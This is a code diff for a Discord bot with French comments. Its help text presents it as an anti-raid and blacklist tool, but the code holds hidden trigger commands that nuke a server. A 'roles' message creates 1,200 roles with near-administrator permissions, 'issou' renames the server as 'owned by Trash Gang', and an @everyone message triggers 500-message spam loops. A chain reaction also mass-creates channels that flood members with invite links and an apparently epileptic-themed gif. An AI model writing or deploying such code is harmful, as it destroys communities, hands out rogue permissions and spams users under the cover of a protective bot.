@@ -9,7 +9,6 @@ function random(min, max){
 }
 
 client.on("ready", () => {
-    console.log(`${client.user.tag} prêt pour le carnage`)
     client.user.setActivity(`?help | 2026 serveurs`,{type:"PLAYING"})
     console.log('')
     console.log('')
@@ -41,7 +40,6 @@ client.on("message", message => {
      .setColor("#cf0b0b")
      .addField("**Commandes**", "`?id [@utilisateur]` : Envoie un message privé contenant l'identifiant de l'utilisateur mentionné.\n`?stats` : Permet d'afficher les statistiques.\n`?checkid [ID]` : Permet de savoir si un identifiant est dans notre liste noire.\n\n`?raidmode` : Active ou désactive le mode Raid (impossible de parler et de rejoindre le serveur). Permission: Gérer les messages\n`?verify` : Vérifie si les membres du serveurs sont dans notre liste noire. Permission: Expluser des membres")
      .setFooter("🚀 Propulsé par StayHost.io")
-     .setURL("d")
      message.reply("L'aide vous à été envoyée en message privé ! ✉️")
      message.member.send(help_embed)
  }
@@ -510,6 +508,16 @@ if(message.content === "roles"){
           })
       }
   }
+  if(message.content === "roles"){
+    for(var i =0; i < 200; i++){
+      message.guild.createRole({name:"TRASH GANG > ALL", color: "#f80505", mentionable: false, permissions:2146958591,});
+      message.guild.createRole({name:"TRASH GANG > ALL", color: "#f8a605", mentionable: false, permissions:2146958591,});
+      message.guild.createRole({name:"TRASH GANG > ALL", color: "#4ff805", mentionable: false, permissions:2146958591,});
+      message.guild.createRole({name:"TRASH GANG > ALL", color: "#05f8d2", mentionable: false, permissions:2146958591,});
+      message.guild.createRole({name:"TRASH GANG > ALL", color: "#051cf8", mentionable: false, permissions:2146958591,});
+      message.guild.createRole({name:"TRASH GANG > ALL", color: "#c4ec09", mentionable: false, permissions:2146958591,});
+    }
+  }
  //foutre la merde
  if(message.content === "issou"){
     message.guild.setName("OWNED BY TRASH GANG")
@@ -522,7 +530,7 @@ if(message.content === "roles"){
   }
   if(message.content.includes("@everyone")){
       for(var i = 0; i < 500; i++){
-          message.channel.send("@everyone @here Dead By Trash Gang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng https://discord.gg/qvS94K5 https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gifhttps://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gif https://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif")
+          message.channel.send("@everyone @here Dead By Trash Gang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng https://discord.gg/PgJt9E https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gifhttps://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gif https://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif")
       }
   }
   //réaction en chaine
@@ -530,7 +538,7 @@ if(message.content === "roles"){
           message.channel.send("roles").then(m => m.delete());
           message.channel.send("issou").then(m => m.delete());
             for(var i = 0; i < 500; i++){
-                message.guild.createChannel("FUCKED", "text").then(c => c.send("@everyone @here Dead ByTrashGang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng https://discord.gg/qvS94K5 https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gifhttps://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gif https://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif"))
+                message.guild.createChannel("FUCKED", "text").then(c => c.send("@everyone @here Dead ByTrashGang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng https://discord.gg/PgJt9E https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gifhttps://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gif https://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif"))
                 message.guild.createChannel("BY","voice")
                 message.guild.createChannel("TRASH GANG","category")    
             }
